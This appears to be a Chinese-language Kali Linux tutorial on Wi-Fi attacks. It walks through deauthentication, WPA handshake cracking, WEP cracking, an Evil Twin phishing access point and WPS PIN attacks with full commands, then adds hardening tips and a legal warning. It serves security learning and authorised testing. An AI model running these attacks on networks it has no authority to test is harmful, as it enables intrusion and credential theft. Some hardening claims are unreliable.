---
title: 无线网络安全：Wi-Fi 破解与防御
slug: kali无线网络安全wifi破解-k8h9i
date: 2026-08-30
visibility: public
tags: Kali Linux, 无线安全, WiFi, Aircrack, 渗透测试, 教程
---

# 无线网络安全：Wi-Fi 破解与防御

Wi-Fi 是现代网络的基础设施，也是安全测试的重要领域。一个弱密码的 Wi-Fi 网络，可能成为整个内网的突破口。本文介绍 Kali Linux 下的无线安全测试技术，从 Wi-Fi 破解到无线防御。

## 一、无线安全基础

### Wi-Fi 加密协议

| 协议 | 安全性 | 漏洞 | 破解难度 |
|------|--------|------|---------|
| WEP | 极低 | 已被完全破解 | 极易 |
| WPA | 中 | 可被字典攻击 | 中等 |
| WPA2 | 中高 | 可被字典攻击 | 中等 |
| WPA3 | 高 | 暂无已知破解 | 极难 |

### 所需硬件

```
- 支持 Monitor 模式和 Packet Injection 的无线网卡
- 常见芯片：Atheros AR9271（推荐）
- 推荐设备：Alfa AWUS036NHA、TP-Link TL-WN722N v1
- 检查网卡是否支持监听模式：iwconfig
```

## 二、Aircrack-ng 工具套件

Aircrack-ng 是最经典的 Wi-Fi 破解工具套件，包含多个组件：

| 工具 | 功能 |
|------|------|
| airmon-ng | 启用监听模式 |
| airodump-ng | 捕获 Wi-Fi 数据包 |
| aireplay-ng | 注入数据包 |
| aircrack-ng | 破解握手包 |
| airbase-ng | 创建虚假 AP |

## 三、WPA/WPA2 破解实战

### 第 1 步：启用监听模式

```bash
# 查看无线网卡
iwconfig

# 启用监听模式
sudo airmon-ng start wlan0

# 网卡名变为 wlan0mon
# 如果有进程干扰，先杀掉
sudo airmon-ng check kill
sudo airmon-ng start wlan0
```

### 第 2 步：扫描周围 AP

```bash
# 扫描周围 Wi-Fi
sudo airodump-ng wlan0mon

# 输出信息：
# BSSID     - AP 的 MAC 地址
# PWR       - 信号强度（越接近 0 越强）
# CH        - 信道
# ENC       - 加密方式
# ESSID     - Wi-Fi 名称
```

### 第 3 步：捕获目标 AP 的握手包

```bash
# 锁定目标 AP 捕获
sudo airodump-ng -c 6 \
  --bssid AA:BB:CC:DD:EE:FF \
  -w capture \
  wlan0mon

# 参数说明：
# -c 6         目标 AP 信道
# --bssid      目标 AP 的 MAC
# -w capture   保存文件名
```

### 第 4 步：触发握手包

如果目标 AP 当前没有客户端连接，需要主动触发握手：

```bash
# 方法 1：取消认证攻击（强制客户端重连）
sudo aireplay-ng -0 5 \
  -a AA:BB:CC:DD:EE:FF \
  -c 11:22:33:44:55:66 \
  wlan0mon

# 参数说明：
# -0 5        发送 5 个取消认证包
# -a          AP 的 MAC
# -c          客户端的 MAC

# 方法 2：持续取消认证（更激进）
sudo aireplay-ng -0 0 \
  -a AA:BB:CC:DD:EE:FF \
  wlan0mon
```

当 airodump-ng 界面右上角出现 `WPA handshake: AA:BB:CC:DD:EE:FF` 时，说明握手包已捕获成功。

### 第 5 步：破解握手包

```bash
# 使用字典破解
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  capture-01.cap

# 指定 ESSID
sudo aircrack-ng -w passwords.txt -e "TargetWiFi" capture-01.cap

# 使用 Hashcat 破解（更快，支持 GPU）
# 先转换格式
sudo hcxtools/hcxpcaptool -o hash.hc22000 capture-01.cap
# 然后用 Hashcat 破解
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

## 四、WEP 破解（仅演示）

WEP 加密已被完全破解，仅作为学习参考：

```bash
# 1. 监听模式
sudo airmon-ng start wlan0

# 2. 捕获 IVs
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# 3. ARP 注入加速
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# 4. 破解（需要足够的 IVs）
sudo aircrack-ng wep_capture-01.cap
```

## 五、Evil Twin 攻击

Evil Twin（邪恶双子星）是创建一个与目标 AP 同名的虚假 AP，诱导用户连接：

```bash
# 1. 创建虚假 AP
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# 2. 配置 DHCP 和 NAT
sudo ifconfig at0 10.0.0.1 up
sudo dhcpd -cf /etc/dhcp/dhcpd.conf at0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:80

# 3. 搭建钓鱼页面
# 用 Social Engineering Toolkit 或自建页面
```

## 六、WPS 攻击

WPS（Wi-Fi Protected Setup）如果开启，可以通过 PIN 码破解：

```bash
# 使用 Reaver 破解 WPS PIN
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# 使用 Bully（更快）
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF

# Pixie Dust 攻击（不需要在线交互）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1
```

## 七、蓝牙安全测试

```bash
# 扫描蓝牙设备
hcitool scan

# 查看设备信息
hcitool info AA:BB:CC:DD:EE:FF

# 蓝牙嗅探
sudo btscanner

# BlueZ 工具
sudo l2ping AA:BB:CC:DD:EE:FF
```

## 八、防御建议

### Wi-Fi 安全加固

| 措施 | 说明 |
|------|------|
| 使用 WPA3 | 最新加密协议，无法被字典攻击 |
| 强密码 | 至少 12 位，含大小写+数字+特殊字符 |
| 关闭 WPS | WPS PIN 可被暴力破解 |
| 关闭 WMM | 减少攻击面 |
| MAC 过滤 | 限制可连接设备（非绝对安全） |
| 隐藏 SSID | 不广播 Wi-Fi 名称（非绝对安全） |
| 定期换密码 | 每 3-6 个月更换一次 |
| 固件更新 | 及时更新路由器固件 |

### 检测无线攻击

```bash
# 检测取消认证攻击（大量 Deauth 包）
sudo airodump-ng wlan0mon --manufacturer

# 使用 Kismet 检测异常
sudo kismet -c wlan0mon
```

## 九、常见问题

| 问题 | 原因 | 解决 |
|------|------|------|
| 网卡不支持监听模式 | 芯片不支持 | 购买支持的网卡 |
| 握手包抓不到 | 没有客户端在线 | 用 aireplay 强制重连 |
| 字典破解失败 | 密码不在字典中 | 扩充字典或用规则 |
| 注入失败 | 网卡不支持注入 | 换支持注入的网卡 |
| airmon 报错 | 进程干扰 | airmon-ng check kill |

## 安全提醒

> 未经授权破解他人 Wi-Fi 是违法行为。本文技术仅用于：1）测试自己的 Wi-Fi 安全性；2）授权的安全评估；3）安全学习与研究。请在合法环境下练习。

## 小结

- WPA/WPA2 破解核心是抓取握手包 + 字典破解
- 监听模式 + 数据包注入需要特定无线网卡
- WPS PIN 攻击可绕过 Wi-Fi 密码
- WPA3 使用 SAE 协议，免疫字典攻击
- 防御核心：WPA3 + 强密码 + 关闭 WPS

> 下一篇我们将学习权限提升技术，从普通用户权限提升到 root/system。
